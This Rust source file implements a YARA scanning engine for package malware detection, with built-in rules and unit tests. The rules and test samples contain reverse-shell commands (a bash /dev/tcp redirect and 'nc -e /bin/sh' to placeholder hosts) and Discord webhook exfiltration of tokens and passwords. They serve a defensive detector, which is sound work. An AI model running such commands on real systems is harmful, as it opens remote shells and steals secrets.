use crate::RuleMatch;
use std::path::Path;
use tracing::{info, warn};

pub const DEFAULT_YARA_RULES: &str = r#"
rule ReverseShellGeneric {
    meta:
        description = "Detects generic reverse shell commands (bash, nc, python)"
        severity = "critical"
    strings:
        $bash = "/bin/sh -i >& /dev/tcp/" ascii
        $bash2 = "/bin/bash -i >& /dev/tcp/" ascii
        $nc1 = "nc -e /bin/sh" ascii
        $nc2 = "nc -e /bin/bash" ascii
        $nc3 = "ncat -e /bin/sh" ascii
        $py = "pty.spawn(\"/bin/bash\")" ascii
        $py2 = "pty.spawn(\"/bin/sh\")" ascii
    condition:
        any of them
}

rule CryptoDrainerGeneric {
    meta:
        description = "Detects crypto wallet drainer and transaction manipulation signatures"
        severity = "high"
    strings:
        $drain1 = "drainAll" ascii nocase
        $drain2 = "drainToken" ascii nocase
        $permit = "signTypedData_v4" ascii
        $seaport = "0x00000000000000ADc04C56Bf30aC9d3c0aAF14bC" ascii
        $transfer_from = "transferFrom(address,address,uint256)" ascii
    condition:
        2 of them
}

rule DiscordWebhookStealer {
    meta:
        description = "Detects Discord webhook exfiltration pattern in scripts"
        severity = "critical"
    strings:
        // A webhook with its id and token, or the prefix with them joined
        // on. The prefix alone is in every Discord library and URL check.
        $hook = /discord(app)?\.com\/api\/webhooks\/(\d+\/[\w\-]|["'`]\s*\+|\$\{|\{)/ ascii nocase
        $token = "token" ascii nocase
        $pass = "password" ascii nocase
    condition:
        $hook and ($token or $pass)
}
"#;

/// Third-party rules shipped in the binary (`rules/yara/`, see the README
/// there for provenance and licence).
const BUNDLED_RULES: &[(&str, &str)] = &[
    (
        "guarddog/threat-runtime-obfuscation-chr.yar",
        include_str!("../rules/yara/guarddog/threat-runtime-obfuscation-chr.yar"),
    ),
    (
        "guarddog/threat-runtime-self-propagation.yar",
        include_str!("../rules/yara/guarddog/threat-runtime-self-propagation.yar"),
    ),
];

/// External variable rule sets may test (GuardDog: `ecosystem == "pypi"`).
/// Undeclared, such rules failed to compile and were silently dropped.
const ECOSYSTEM: &str = "ecosystem";

pub struct YaraEngine {
    /// The built-in rules compiled together with a rules directory's.
    /// `None` without a directory: the shared built-in set (`builtin`).
    rules: Option<yara_x::Rules>,
}

impl YaraEngine {
    /// Initialize YaraEngine with default built-in rules and optional directory of .yar files
    pub fn new(custom_rules_dir: Option<&Path>) -> Self {
        // With a directory, compiled at every scan as before: its files can
        // change between two scans of one process.
        let custom = custom_rules_dir.filter(|dir| dir.is_dir());
        Self {
            rules: custom.map(|dir| Self::compile(Some(dir))),
        }
    }

    /// The built-in rules, compiled once per process. `deps`, `watch`,
    /// `guard`, `installed` and the server run many scans, and each one
    /// compiled the same rules again: about 0.3 s of every scan in a debug
    /// build.
    fn builtin() -> &'static yara_x::Rules {
        static RULES: std::sync::OnceLock<yara_x::Rules> = std::sync::OnceLock::new();
        RULES.get_or_init(|| Self::compile(None))
    }

    fn compile(custom_rules_dir: Option<&Path>) -> yara_x::Rules {
        let mut compiler = yara_x::Compiler::new();
        if let Err(e) = compiler.define_global(ECOSYSTEM, "") {
            warn!("Failed to declare YARA global {}: {}", ECOSYSTEM, e);
        }

        // 1. Add default rules
        if let Err(e) = compiler.add_source(DEFAULT_YARA_RULES) {
            warn!("Failed to compile default YARA rules: {}", e);
        }
        for (origin, source) in BUNDLED_RULES {
            if let Err(e) =
                compiler.add_source(yara_x::SourceCode::from(*source).with_origin(*origin))
            {
                warn!("Failed to compile bundled YARA rules {}: {}", origin, e);
            }
        }

        // 2. Add custom rules from directory if provided
        if let Some(dir) = custom_rules_dir {
            if dir.is_dir() {
                // `include "x.meta"` resolves against the rules directory.
                compiler.add_include_dir(dir);
                Self::load_rules_from_dir(dir, &mut compiler);
            }
        }

        compiler.build()
    }

    fn load_rules_from_dir(dir: &Path, compiler: &mut yara_x::Compiler) {
        if let Ok(entries) = std::fs::read_dir(dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if path.is_file() {
                    let ext = path.extension().and_then(|s| s.to_str()).unwrap_or("");
                    if ext == "yar" || ext == "yara" {
                        if let Ok(source) = std::fs::read_to_string(&path) {
                            let origin = path.to_string_lossy().to_string();
                            let code =
                                yara_x::SourceCode::from(source.as_str()).with_origin(origin);
                            if let Err(e) = compiler.add_source(code) {
                                warn!("Failed to compile YARA rule file {:?}: {}", path, e);
                            } else {
                                info!("Loaded custom YARA rule: {:?}", path);
                            }
                        }
                    }
                }
            }
        }
    }

    /// A scanner to reuse across files. Building one instantiates a wasm
    /// module, which used to happen once per scanned file. `ecosystem` is
    /// what the scanned tree is (`npm`, `pypi`, `extension`, or empty).
    pub fn scanner(&self, ecosystem: &str) -> Option<yara_x::Scanner<'_>> {
        let rules = match &self.rules {
            Some(with_dir) => with_dir,
            None => Self::builtin(),
        };
        let mut scanner = yara_x::Scanner::new(rules);
        let _ = scanner.set_global(ECOSYSTEM, ecosystem);
        Some(scanner)
    }

    /// Scan a buffer/file data with YARA rules and return findings as RuleMatch
    #[cfg(test)]
    pub fn scan_data(&self, file_path: &str, data: &[u8]) -> Vec<RuleMatch> {
        self.scanner("")
            .map(|mut s| scan_with(&mut s, file_path, data))
            .unwrap_or_default()
    }
}

/// Run `scanner` over `data`. Severity comes from the rule's
/// `meta: severity`; custom rules used to be forced to "medium".
pub fn scan_with(
    scanner: &mut yara_x::Scanner<'_>,
    file_path: &str,
    data: &[u8],
) -> Vec<RuleMatch> {
    let Ok(scan_results) = scanner.scan(data) else {
        return Vec::new();
    };
    scan_results
        .matching_rules()
        .filter(|rule| path_included(rule, file_path))
        .map(|rule| {
            let rule_id = rule.identifier();
            let severity = rule
                .metadata()
                .find_map(|(key, value)| match value {
                    yara_x::MetaValue::String(s) if key == "severity" => Some(s.to_lowercase()),
                    _ => None,
                })
                .filter(|s| ["critical", "high", "medium", "low"].contains(&s.as_str()))
                .unwrap_or_else(|| "medium".to_string());
            RuleMatch {
                file_path: file_path.to_string(),
                line_number: 1,
                matched_pattern: format!("YARA Rule: {}", rule_id),
                severity,
                context: format!("Matched YARA rule {} in {}", rule_id, file_path),
            }
        })
        .collect()
}

/// A rule's `meta: path_include = "*.py,*/setup.py"` (GuardDog convention):
/// the rule applies only to matching files. Ignored, `dependency_confusion`
/// for package.json fired on every bundled JS file.
fn path_included(rule: &yara_x::Rule<'_, '_>, file_path: &str) -> bool {
    let Some(globs) = rule.metadata().find_map(|(key, value)| match value {
        yara_x::MetaValue::String(s) if key == "path_include" => Some(s),
        _ => None,
    }) else {
        return true;
    };
    let name = file_path.rsplit('/').next().unwrap_or(file_path);
    globs
        .split(',')
        .map(str::trim)
        .any(|g| glob_match(g, file_path) || glob_match(g, name))
}

/// `*` matches any run of characters (including `/`); everything else is literal.
fn glob_match(pattern: &str, text: &str) -> bool {
    let (p, t) = (pattern.as_bytes(), text.as_bytes());
    let (mut pi, mut ti) = (0, 0);
    let mut star: Option<(usize, usize)> = None;
    while ti < t.len() {
        if pi < p.len() && p[pi] == b'*' {
            star = Some((pi, ti));
            pi += 1;
        } else if pi < p.len() && p[pi] == t[ti] {
            pi += 1;
            ti += 1;
        } else if let Some((sp, st)) = star {
            pi = sp + 1;
            ti = st + 1;
            star = Some((sp, st + 1));
        } else {
            return false;
        }
    }
    p[pi..].iter().all(|&c| c == b'*')
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_yara_reverse_shell_detection() {
        let engine = YaraEngine::new(None);
        let sample = b"import os\nos.system('/bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')";
        let findings = engine.scan_data("exploit.py", sample);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.matched_pattern.contains("ReverseShellGeneric")));
    }

    #[test]
    fn test_yara_discord_webhook_stealer() {
        let engine = YaraEngine::new(None);
        let sample = b"const url = 'https://discord.com/api/webhooks/123/xyz'; fetch(url, { body: JSON.stringify({ token: 'stolen' }) });";
        let findings = engine.scan_data("stealer.js", sample);
        assert!(!findings.is_empty());
        assert!(findings
            .iter()
            .any(|f| f.matched_pattern.contains("DiscordWebhookStealer")));
    }

    #[test]
    fn discord_webhook_prefix_alone_is_not_a_stealer() {
        let engine = YaraEngine::new(None);
        let fires = |sample: &str| {
            engine
                .scan_data("a.js", sample.as_bytes())
                .iter()
                .any(|f| f.matched_pattern.contains("DiscordWebhookStealer"))
        };
        // A URL check and a redaction pattern, next to the word "token".
        for sample in [
            "if (url.startsWith('https://discord.com/api/webhooks/')) return maskToken(url);",
            "const WEBHOOK = 'https://discord.com/api/webhooks/[REDACTED]'; // token removed",
        ] {
            assert!(!fires(sample), "{sample}");
        }
        for sample in [
            "post('https://discord.com/api/webhooks/123456789012345678/ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrst', {token})",
            "post('https://discordapp.com/api/webhooks/' + id + '/' + key, {password})",
            "post(`https://discord.com/api/webhooks/${id}/${key}`, {token})",
            "requests.post(f\"https://discord.com/api/webhooks/{wid}/{key}\", json={'token': t})",
        ] {
            assert!(fires(sample), "{sample}");
        }
    }

    #[test]
    fn includes_globals_and_path_include_work() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("words.meta"),
            "rule shared_words { strings: $a = \"evil-word\" condition: $a }",
        )
        .unwrap();
        std::fs::write(
            dir.path().join("rules.yar"),
            "include \"words.meta\"\n\
             rule py_only { meta: path_include = \"*.py,*/setup.py\" strings: $a = \"evil-word\" condition: $a }\n\
             rule npm_only { strings: $a = \"evil-word\" condition: $a and ecosystem == \"npm\" }",
        )
        .unwrap();
        let engine = YaraEngine::new(Some(dir.path()));
        let names = |eco: &str, path: &str| -> Vec<String> {
            let mut s = engine.scanner(eco).unwrap();
            let mut n: Vec<String> = scan_with(&mut s, path, b"x evil-word y")
                .into_iter()
                .map(|m| m.matched_pattern)
                .collect();
            n.sort();
            n
        };
        assert_eq!(
            names("pypi", "pkg/setup.py"),
            vec!["YARA Rule: py_only", "YARA Rule: shared_words"]
        );
        assert_eq!(
            names("npm", "index.js"),
            vec!["YARA Rule: npm_only", "YARA Rule: shared_words"]
        );
    }

    #[test]
    fn bundled_guarddog_rules_fire() {
        let engine = YaraEngine::new(None);
        let chr = b"exec(''.join(map(chr, [112, 114, 105, 110, 116])))";
        assert!(engine
            .scan_data("evil.py", chr)
            .iter()
            .any(|m| m.matched_pattern == "YARA Rule: threat_runtime_obfuscation_chr"));
        // path_include keeps the Python rule off JavaScript.
        assert!(engine.scan_data("evil.js", chr).is_empty());
    }

    /// The built-in set is compiled once and shared. A rules directory's
    /// rules stay with the engine made for it, beside the built-in ones.
    #[test]
    fn a_rules_directory_does_not_reach_the_shared_builtin_set() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("custom.yar"),
            "rule OnlyHere { strings: $a = \"only-here-marker\" condition: $a }",
        )
        .unwrap();
        let names = |engine: YaraEngine| {
            let sample = b"only-here-marker; nc -e /bin/sh 203.0.113.5 4444";
            let mut names: Vec<String> = engine
                .scan_data("a.sh", sample)
                .into_iter()
                .map(|m| m.matched_pattern)
                .collect();
            names.sort();
            names
        };
        let builtin = ["YARA Rule: ReverseShellGeneric"];
        assert_eq!(
            names(YaraEngine::new(Some(dir.path()))),
            ["YARA Rule: OnlyHere", "YARA Rule: ReverseShellGeneric"]
        );
        assert_eq!(names(YaraEngine::new(None)), builtin);
        // A directory that is not there: the built-in rules, as before.
        let missing = dir.path().join("missing");
        assert_eq!(names(YaraEngine::new(Some(&missing))), builtin);
        assert!(std::ptr::eq(YaraEngine::builtin(), YaraEngine::builtin()));
    }

    #[test]
    fn glob_matching() {
        assert!(glob_match("*.py", "a/b.py"));
        assert!(glob_match("*/setup.py", "pkg/setup.py"));
        assert!(!glob_match("*/setup.py", "setup.py"));
        assert!(glob_match("setup.py", "setup.py"));
        assert!(!glob_match("*.py", "a.pyc"));
    }

    #[test]
    fn severity_comes_from_rule_meta_and_scanner_is_reusable() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(
            dir.path().join("custom.yar"),
            "rule CustomDropper { meta: severity = \"critical\" strings: $a = \"evil-dropper\" condition: $a }\n\
             rule NoMeta { strings: $a = \"plain-marker\" condition: $a }",
        )
        .unwrap();
        let engine = YaraEngine::new(Some(dir.path()));
        let mut scanner = engine.scanner("").unwrap();
        let first = scan_with(&mut scanner, "a.js", b"x evil-dropper y");
        let second = scan_with(&mut scanner, "b.js", b"plain-marker");
        assert_eq!(first[0].severity, "critical");
        assert_eq!(second[0].severity, "medium");
        assert_eq!(second[0].file_path, "b.js");
    }
}
